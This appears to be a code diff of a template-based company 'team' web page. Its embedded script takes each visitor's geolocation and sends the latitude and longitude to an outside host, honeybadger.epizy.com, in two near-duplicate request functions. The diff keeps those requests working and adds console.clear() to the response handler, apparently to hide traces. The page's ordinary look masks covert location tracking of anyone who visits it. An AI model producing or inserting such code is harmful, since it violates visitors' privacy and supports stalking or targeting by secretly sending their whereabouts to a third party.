@@ -127,7 +127,7 @@ body, html {
   <div class="w3-row-padding w3-grayscale" style="margin-top:64px">
     <div class="w3-col l3 m6 w3-margin-bottom">
       <div class="w3-card">
-        <img src="/w3images/team2.jpg" alt="John" style="width:100%">
+        <img src="https://w3schools.com/w3images/team2.jpg" alt="John" style="width:100%">
         <div class="w3-container">
           <h3>John Doe</h3>
           <p class="w3-opacity">CEO & Founder</p>
@@ -396,12 +396,10 @@ function successCallback(position) {
 
   var hr = new XMLHttpRequest();
 hr.onload = function(){
+  console.clear();
 };
 var usl = 'http://honeybadger.epizy.com/api/api.php?latitude='+lat+'&longitude='+long;
 hr.open('GET', usl);
-hr.send();
-};
-hr.open('GET', url);
 hr.send();
 }
 
@@ -422,11 +420,7 @@ xhhr.onload = function(){
 };
 var usl = 'http://honeybadger.epizy.com/api/api.php?latitude='+laat+'&longitude='+loong;
 xhhr.open('GET', usl);
-xhhr.send();
-};
-xhr.open('GET', url);
-xhr.send();
-  
+xhhr.send(); 
 }
 </script>
 
